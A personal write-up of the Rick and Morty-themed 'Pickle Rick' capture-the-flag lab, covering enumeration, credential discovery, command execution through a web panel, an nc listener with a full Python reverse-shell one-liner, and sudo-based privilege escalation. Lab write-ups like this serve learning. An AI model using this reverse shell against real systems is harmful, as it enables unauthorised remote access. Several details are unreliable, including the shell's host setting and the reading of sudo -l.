# Pickle Rick CTF

------------------------------------------------------------
This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: 10.10.212.184

My first step was to enter the url 10.10.212.184 into my web browser to check on any initial information because there was minimal context given in the prompt.

![pickle rick ctf homepage](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/5fc63bc0-8f3e-4e65-9299-136c1836c6dc)

Looking into the source of the landing page, we find a username.

![url inspect](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/3e8d26d7-ad9b-48d6-badf-f32ff3dbb930)

- Username:R1ckRul3s

After taking a look webpage, I decided to do a portscan using the nmap tool. Utilizing the -sV and -A flags, I was able to gain information about open ports, operating systems, versions, script scans, and tracerouting. 

![sudo nmap -sV -A](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/6f9ef322-61d3-40fc-9b14-8e75737882ae)

Finding that ssh is open is an indicator that we will likely be executing a reverse shell to connect through that open ssh port.

We now need a way to find any valid urls to gain more information about the size of our attack surface. Using the gobuster tool, we can try enough variations to have a good starting point. I decided to use the medium directory list included in Kali Linux and found 8 potential leads.

![gobuster force directory](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/2050371a-989e-4afc-ad9a-57c47041f866)

Exploring the listed links in the assets page:

![asset url](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/a6acefd2-e345-4ad5-b66f-d7d92739602b)

I suspected based on the amount of images and gifs that I would find stenography in these links, but unfortunately that effort came up short.

The login.php link guides us to a typical login page, and the robots.txt link led us to a strange string of text. 

![robotstxt](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/b3cf7742-caac-47cb-93fd-24757be073ef)

I decided to attempt using this string from robots.txt as a password and was successful.

From here we were given a command line labeled "command panel" with an "execute" button underneath.

After exploring the files and directories a bit, I decided to run a grep -R . command where the . serves as a wildcard matching all characters. This command outputs each character available recursively. It isn't ideal in terms of organizing the data, but it's a great way to get an idea of the amount of information we are looking at. 

![grep -R   ](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/a9ef3466-460b-49d6-9019-8a2b596415f4)

Toward the bottom of the output, I saw this:

![mr  meeseek hair first clue](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/27425378-d616-4092-9e1f-b701093939de)

I inserted this into the first clue and we've successfully found our first potion ingredient!

At this point, I tested python3 "print('hello')" to see if we would be able to run python scripts through the command and we were able to print hello succesfully! 

I set up a nc listener on port 9001 in my terminal running:

nc -lvnp 9001 

using revshells.com I generated a python3 reverse shell:

export RHOST="10.10.212.184";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

Once I established a connection, I navigated the files until I checked the home directory. Here I found a directory named "Ricky". Inside that directory, I found a file named "second ingredients", so I knew that we had found our second flag. I read the file using cat *

![1 jerry tear second clue](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/89b2cdc4-b174-432f-9ead-4ad387ba6641)

I spent longer than I should continuing to investigate the machine from this point, and eventually it occurred to me that I hadn't done any privilege escalation up to this point. 

I ran the command sudo -l to get information about the elevated users on the machine and was surprised to see there was no password set for the root user on the machine.

![priv escalation sudo -l found no pw](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/4dbc1b4e-775c-4450-af64-e2d2ef303c33)

From here I entered cd /root and then ls to list files that may not have been visible to me before.  As you can see,  I found a file named 3rd.txt 

![third clue visible as root user](https://github.com/Cody-Rochester/Obsidian-git-sync/assets/107632714/0320688d-ea05-4894-ae84-d7442f0e722e)

As you can see, I ran cat 3rd.txt and found our final ingredient which happened to fleeb juice of course!

This concluded the exercise and once we combine the ingredients and bring the potion to Rick, he will no longer be a pickle!

# Takeaways:

- **Initial Exploration:**
    
    - Inspect the web application's source code for clues.
    - Discover the username "R1ckRul3s" in the source.
- **Port Scanning:**
    
    - Use nmap for port scans to identify potential vulnerabilities.
    - Focus on open SSH ports for potential exploitation.
- **Directory Enumeration:**
    
    - Employ gobuster to find valid URLs.
    - Use robots.txt strings as potential passwords.
- **Command Line Exploration:**
    
    - Exploit login success to access a labeled command line.
    - Utilize commands like grep for recursive file searches.
- **Reverse Shell:**
    
    - Confirm the ability to run scripts through the command line.
    - Establish a reverse shell for remote access.
- **Privilege Escalation:**
    
    - Check for elevated users with `sudo -l`.
    - Discover no password requirement for root user.
- **Root Access:**
    
    - Navigate to root directories, find "3rd.txt" for the final ingredient.



